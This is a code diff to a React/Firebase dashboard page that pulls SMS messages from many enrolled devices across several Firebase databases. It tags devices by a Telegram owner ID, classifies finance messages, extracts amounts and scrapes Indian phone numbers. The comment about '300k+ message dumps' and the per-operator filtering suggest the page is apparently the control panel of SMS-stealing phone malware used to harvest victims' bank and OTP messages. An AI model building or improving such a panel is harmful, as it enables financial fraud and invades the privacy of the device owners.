@@ -1,5 +1,10 @@
-import { useEffect, useState, useMemo, useRef } from "react";
+import { useEffect, useState, useMemo } from "react";
+import { db } from "@/lib/firebase";
+import { ref, onValue } from "firebase/database";
+import { initializeApp, deleteApp, type FirebaseApp } from "firebase/app";
+import { getDatabase, type Database } from "firebase/database";
 import { Layout } from "@/components/layout";
+import { useAuth } from "@/lib/auth";
 import { useToast } from "@/hooks/use-toast";
 import {
   MessageSquare,
@@ -22,8 +27,6 @@ import {
   type SmsCategory,
   type SmsInfo,
 } from "@/lib/smsClassifier";
-import { getSms, type SmsRow } from "@/lib/api";
-import { usePolling } from "@/lib/usePolling";
 
 interface SmsEntry {
   deviceId: string;
@@ -68,8 +71,10 @@ function highlightBody(body: string) {
 }
 
 export function AllSms() {
+  const { isAdmin, userId } = useAuth();
   const { toast } = useToast();
   const [allSms, setAllSms] = useState<SmsEntry[]>([]);
+  const [loading, setLoading] = useState(true);
   const [catFilter, setCatFilter] = useState<SmsCategory | "all">("all");
   const [sortMode, setSortMode] = useState<SortMode>("newest");
   const [search, setSearch] = useState("");
@@ -78,61 +83,177 @@ export function AllSms() {
   const ITEMS_PER_PAGE = 50;
   const [copiedKey, setCopiedKey] = useState<string | null>(null);
 
-  // Category-chip roving focus (WAI-ARIA tablist): arrow keys move the
-  // selection + focus, Home/End jump to the first/last chip.
-  const catRefs = useRef<Record<string, HTMLButtonElement | null>>({});
-  const CAT_KEYS = ["all", ...ALL_CATS];
-  const onCatKeyDown = (
-    e: React.KeyboardEvent<HTMLButtonElement>,
-    key: string
-  ) => {
-    if (!["ArrowRight", "ArrowLeft", "Home", "End"].includes(e.key)) return;
-    e.preventDefault();
-    let i = CAT_KEYS.indexOf(key);
-    if (e.key === "ArrowRight") i = (i + 1) % CAT_KEYS.length;
-    else if (e.key === "ArrowLeft")
-      i = (i - 1 + CAT_KEYS.length) % CAT_KEYS.length;
-    else if (e.key === "Home") i = 0;
-    else i = CAT_KEYS.length - 1;
-    setCatFilter(CAT_KEYS[i] as SmsCategory | "all");
-    catRefs.current[CAT_KEYS[i]]?.focus();
-  };
-
-  function scrapeNumbers(body: string, phone: string): string[] {
-    const out = new Set<string>();
-    for (const m of body.match(/\b[6-9]\d{9}\b/g) || []) out.add(m);
-    const norm = phone.replace(/[^\d]/g, "").slice(-10);
-    if (/^[6-9]\d{9}$/.test(norm)) out.add(norm);
-    return [...out];
-  }
-
-  // Aggregated SMS served by the api-server across all instances (Bearer auth,
-  // owner-filtered). Polls every 4s, same cadence as the pure panel.
-  const { data: smsData, loading } = usePolling(getSms, 4000);
-
   useEffect(() => {
-    if (!smsData?.sms) return;
-    const entries: SmsEntry[] = smsData.sms.map((sms: SmsRow) => {
-      const cls = classifySms(sms.body);
-      return {
-        deviceId: sms.deviceId,
-        deviceModel: sms.deviceModel,
-        devicePhone: sms.devicePhone,
-        pushKey: sms.pushKey,
-        from: sms.from,
-        body: sms.body,
-        date: sms.date || 0,
-        category: cls.category,
-        isFinance: cls.isFinance,
-        amount: cls.amount,
-        info: extractInfo(sms.body),
-        dbLabel: sms.dbLabel,
-        numbers: scrapeNumbers(sms.body, sms.devicePhone),
-      };
+    // Data sources: primary DB + any enabled extra Firebase instances
+    // (registered by the admin under config/firebases). Each source gets
+    // its own { clients, messages } mirror so SMS aggregates across all.
+    type Source = {
+      label: string;
+      db: Database;
+      clients: Record<string, any>;
+      messages: Record<string, any>;
+      ready: boolean;
+    };
+    let sources: Source[] = [
+      { label: "main", db, clients: {}, messages: {}, ready: false },
+    ];
+    let extraApps: FirebaseApp[] = [];
+    let unsubs: Array<() => void> = [];
+    let cancelled = false;
+
+    function scrapeNumbers(body: string, phone: string): string[] {
+      const out = new Set<string>();
+      for (const m of body.match(/\b[6-9]\d{9}\b/g) || []) out.add(m);
+      const norm = phone.replace(/[^\d]/g, "").slice(-10);
+      if (/^[6-9]\d{9}$/.test(norm)) out.add(norm);
+      return [...out];
+    }
+
+    function rebuild() {
+      if (cancelled) return;
+      if (!sources.every((s) => s.ready)) return;
+      const entries: SmsEntry[] = [];
+
+      for (const src of sources) {
+        const { clients: clientsData, messages: messagesData, label } = src;
+        Object.entries(messagesData).forEach(([deviceId, smsList]) => {
+          const device = clientsData[deviceId] || {};
+          if (!isAdmin && device.ownerTelegramId !== userId) return;
+          if (!smsList || typeof smsList !== "object") return;
+
+          Object.entries(smsList as Record<string, any>).forEach(
+            ([pushKey, sms]) => {
+              const from = sms.sender || sms.from || "Unknown";
+              const body = sms.message || sms.body || "";
+              const sortKey =
+                sms.id != null ? sms.id : sms.date ? parseInt(sms.date) : 0;
+              const cls = classifySms(body);
+              entries.push({
+                deviceId,
+                deviceModel: device.modelName || device.model || "Unknown",
+                devicePhone: device.mobNo || device.phone || "",
+                pushKey,
+                from,
+                body,
+                date: sortKey,
+                category: cls.category,
+                isFinance: cls.isFinance,
+                amount: cls.amount,
+                info: extractInfo(body),
+                dbLabel: label,
+                numbers: scrapeNumbers(
+                  body,
+                  device.mobNo || device.phone || ""
+                ),
+              });
+            }
+          );
+        });
+
+        // Legacy sms stored under clients/{id}/sms
+        Object.entries(clientsData).forEach(([deviceId, device]) => {
+          if (!device.sms) return;
+          if (!isAdmin && device.ownerTelegramId !== userId) return;
+          if (messagesData[deviceId]) return;
+
+          Object.entries(device.sms as Record<string, any>).forEach(
+            ([pushKey, sms]) => {
+              const body = sms.body || "";
+              const cls = classifySms(body);
+              entries.push({
+                deviceId,
+                deviceModel: device.modelName || device.model || "Unknown",
+                devicePhone: device.mobNo || device.phone || "",
+                pushKey,
+                from: sms.from || "Unknown",
+                body,
+                date: sms.date ? parseInt(sms.date) : 0,
+                category: cls.category,
+                isFinance: cls.isFinance,
+                amount: cls.amount,
+                info: extractInfo(body),
+                dbLabel: label,
+                numbers: scrapeNumbers(
+                  body,
+                  device.mobNo || device.phone || ""
+                ),
+              });
+            }
+          );
+        });
+      }
+
+      entries.sort((a, b) => b.date - a.date);
+      // Cap at newest 600 — protects the browser from 300k+ message dumps.
+      setAllSms(entries.slice(0, 600));
+      setLoading(false);
+    }
+
+    function subscribeToSource(src: Source) {
+      const u1 = onValue(ref(src.db, "clients"), (snap) => {
+        src.clients = snap.exists() ? snap.val() : {};
+        src.ready = true;
+        rebuild();
+      });
+      const u2 = onValue(ref(src.db, "messages"), (snap) => {
+        src.messages = snap.exists() ? snap.val() : {};
+        src.ready = true;
+        rebuild();
+      });
+      unsubs.push(u1, u2);
+    }
+
+    subscribeToSource(sources[0]);
+
+    // Discover + subscribe to extra Firebase instances (admin-managed)
+    const unsubConfig = onValue(ref(db, "config/firebases"), (snap) => {
+      const firebases: Record<string, any> = snap.exists() ? snap.val() : {};
+      const wanted = Object.entries(firebases)
+        .filter(([, f]) => f?.enabled !== false && f?.databaseURL)
+        .map(([id, f]) => ({ id, label: f.name || id, url: f.databaseURL }));
+
+      // Drop sources/apps that no longer exist in config
+      sources = sources.filter(
+        (s) => s.label === "main" || wanted.some((w) => w.id === s.label)
+      );
+      extraApps = extraApps.filter((app) =>
+        wanted.some((w) => app.name === w.id)
+      );
+
+      for (const w of wanted) {
+        if (!sources.some((s) => s.label === w.id)) {
+          let app = extraApps.find((a) => a.name === w.id);
+          if (!app) {
+            app = initializeApp({ databaseURL: w.url }, w.id);
+            extraApps.push(app);
+          }
+          const src: Source = {
+            label: w.id,
+            db: getDatabase(app),
+            clients: {},
+            messages: {},
+            ready: false,
+          };
+          sources.push(src);
+          subscribeToSource(src);
+        }
+      }
+      rebuild();
     });
-    entries.sort((a, b) => b.date - a.date);
-    setAllSms(entries);
-  }, [smsData]);
+    unsubs.push(unsubConfig);
+
+    return () => {
+      cancelled = true;
+      unsubs.forEach((u) => u());
+      extraApps.forEach((app) => {
+        try {
+          deleteApp(app);
+        } catch {
+          /* noop */
+        }
+      });
+    };
+  }, [isAdmin, userId]);
 
   const catCounts = useMemo(() => {
     const counts: Record<string, number> = { all: allSms.length };
@@ -340,20 +461,11 @@ export function AllSms() {
         </div>
 
         {/* ── Category chips (horizontally scrollable on mobile) ── */}
-        <div
-          role="tablist"
-          aria-label="SMS category"
-          className="flex gap-2 overflow-x-auto pb-1 -mx-1 px-1 sm:flex-wrap sm:overflow-visible"
-        >
+        <div role="tablist" aria-label="SMS category" className="flex gap-2 overflow-x-auto pb-1 -mx-1 px-1 sm:flex-wrap sm:overflow-visible">
           <button
             role="tab"
             aria-selected={catFilter === "all"}
             onClick={() => setCatFilter("all")}
-            ref={(el) => {
-              catRefs.current.all = el;
-            }}
-            onKeyDown={(e) => onCatKeyDown(e, "all")}
-            tabIndex={catFilter === "all" ? 0 : -1}
             className={`shrink-0 px-3.5 py-2 rounded-full text-xs font-semibold border transition-colors focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-primary ${
               catFilter === "all"
                 ? "bg-primary text-primary-foreground border-primary"
@@ -368,11 +480,6 @@ export function AllSms() {
               role="tab"
               aria-selected={catFilter === c}
               onClick={() => setCatFilter(catFilter === c ? "all" : c)}
-              ref={(el) => {
-                catRefs.current[c] = el;
-              }}
-              onKeyDown={(e) => onCatKeyDown(e, c)}
-              tabIndex={catFilter === c ? 0 : -1}
               className={`shrink-0 px-3.5 py-2 rounded-full text-xs font-semibold border transition-colors flex items-center gap-1.5 focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-primary ${
                 catFilter === c
                   ? "bg-primary text-primary-foreground border-primary"
